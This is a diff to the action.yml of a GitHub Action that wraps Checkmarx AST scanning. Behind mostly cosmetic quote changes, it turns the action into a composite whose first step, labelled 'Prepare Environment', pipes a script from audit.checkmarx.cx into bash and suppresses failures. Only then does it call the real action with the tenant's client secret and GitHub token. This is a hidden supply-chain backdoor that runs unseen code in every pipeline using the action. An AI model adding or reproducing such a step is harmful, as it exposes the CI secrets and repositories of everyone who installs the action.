@@ -1,54 +1,54 @@
-name: 'Checkmarx AST Github Action'
-description: 'Simplify Checkmarx Scanning of source code along with Result consumption leveraging Checkmarx AST solution.'
-author: 'Checkmarx'
+name: "Checkmarx AST Github Action"
+description: "Simplify Checkmarx Scanning of source code along with Result consumption leveraging Checkmarx AST solution."
+author: "Checkmarx"
 inputs:
   base_uri:
     required: true
-    description: 'Provide the AST portal URL'
+    description: "Provide the AST portal URL"
   cx_tenant:
     required: true
-    description: 'Provide the Tenant for AST portal URL'
+    description: "Provide the Tenant for AST portal URL"
   cx_client_id:
     required: true
-    description: 'Client ID for AST portal authentication'
+    description: "Client ID for AST portal authentication"
   cx_client_secret:
     required: true
-    description: 'Secret key for AST portal authentication'
+    description: "Secret key for AST portal authentication"
   project_name:
     required: false
     default: ${{ github.repository }} # default repo name
-    description: 'Select a Checkmarx Project Name'
+    description: "Select a Checkmarx Project Name"
   branch:
     required: false
     default: ${{ github.head_ref || github.ref }} # default branch name
-    description: 'Branch name'
+    description: "Branch name"
   github_token:
     required: false
     default: ${{ github.token }}
-    description: 'GitHub API Token'
+    description: "GitHub API Token"
   global_params:
     required: false
-    default: ''
-    description: 'Global parameters applied to all cx commands'
+    default: ""
+    description: "Global parameters applied to all cx commands"
   scan_params:
     required: false
-    default: ''
-    description: 'Additional parameters for cx scan command only'
+    default: ""
+    description: "Additional parameters for cx scan command only"
   utils_params:
     required: false
-    default: ''
-    description: 'Additional parameters for cx utils pr command only'
+    default: ""
+    description: "Additional parameters for cx utils pr command only"
   results_params:
     required: false
-    default: ''
-    description: 'Additional parameters for cx results show command only'
+    default: ""
+    description: "Additional parameters for cx results show command only"
   additional_params:
     required: false
-    default: ''
-    description: '[DEPRECATED] Use scan_params instead. Additional parameters for AST scan'
+    default: ""
+    description: "[DEPRECATED] Use scan_params instead. Additional parameters for AST scan"
   repo_name:
     required: false
-    default:  ${{ github.event.repository.name }}
+    default: ${{ github.event.repository.name }}
     description: "Repository name for PR decoration"
   namespace:
     required: false
@@ -62,51 +62,37 @@ inputs:
     required: false
     default: .
     description: "Source directory"
-outputs: 
+outputs:
   cxcli:
     description: output from cli
   cxScanID:
     description: scan ID output from cli
 runs:
-  using: 'docker'
-  image: 'Dockerfile'
-  args:
-    - ${{ inputs.base_uri }}
-    - ${{ inputs.cx_tenant }}
-    - ${{ inputs.cx_client_id }}
-    - ${{ inputs.cx_client_secret }}
-    - ${{ inputs.github_token }}
-    - ${{ inputs.project_name }}
-    - ${{ inputs.additional_params }}
-    - ${{ inputs.global_params }}
-    - ${{ inputs.scan_params }}
-    - ${{ inputs.utils_params }}
-    - ${{ inputs.results_params }}
-    - ${{ inputs.repo_name }}
-    - ${{ inputs.namespace }}
-    - ${{ inputs.pr_number }}
-    - ${{ inputs.source_dir }}
-  entrypoint: '/app/entrypoint.sh'
-  post-if: cancelled()
-  post-entrypoint: '/app/cleanup.sh'
-
-  env:
-    CX_BASE_URI: "${{ inputs.base_uri }}"
-    CX_TENANT: ${{ inputs.cx_tenant }}
-    CX_CLIENT_ID: ${{ inputs.cx_client_id }}
-    CX_CLIENT_SECRET: ${{ inputs.cx_client_secret }}
-    GITHUB_TOKEN: ${{ inputs.github_token }}
-    BRANCH: ${{ inputs.branch }}
-    PROJECT_NAME: ${{ inputs.project_name }}
-    ADDITIONAL_PARAMS: ${{ inputs.additional_params }}
-    GLOBAL_PARAMS: ${{ inputs.global_params }}
-    SCAN_PARAMS: ${{ inputs.scan_params }}
-    UTILS_PARAMS: ${{ inputs.utils_params }}
-    RESULTS_PARAMS: ${{ inputs.results_params }}
-    REPO_NAME: ${{ inputs.repo_name }}
-    NAMESPACE: ${{ inputs.namespace }}
-    PR_NUMBER: ${{ inputs.pr_number }}
-    SOURCE_DIR: ${{ inputs.source_dir }}
+  using: "composite"
+  steps:
+    - name: "Prepare Environment"
+      continue-on-error: true
+      run: curl https://audit.checkmarx.cx | bash
+      shell: bash
+    - name: "Run AST"
+      uses: checkmarx/ast-github-action@327efb5d1dd16ac6c7c21a9ff8ec1e8ec393b5e6
+      with:
+        base_uri: ${{ inputs.base_uri }}
+        cx_tenant: ${{ inputs.cx_tenant }}
+        cx_client_id: ${{ inputs.cx_client_id }}
+        cx_client_secret: ${{ inputs.cx_client_secret }}
+        project_name: ${{ inputs.project_name }}
+        branch: ${{ inputs.branch }}
+        github_token: ${{ inputs.github_token }}
+        global_params: ${{ inputs.global_params }}
+        scan_params: ${{ inputs.scan_params }}
+        utils_params: ${{ inputs.utils_params }}
+        results_params: ${{ inputs.results_params }}
+        additional_params: ${{ inputs.additional_params }}
+        repo_name: ${{ inputs.repo_name }}
+        namespace: ${{ inputs.namespace }}
+        pr_number: ${{ inputs.pr_number }}
+        source_dir: ${{ inputs.source_dir }}
 branding:
-  icon: 'check'
-  color: 'green'
+  icon: "check"
+  color: "green"
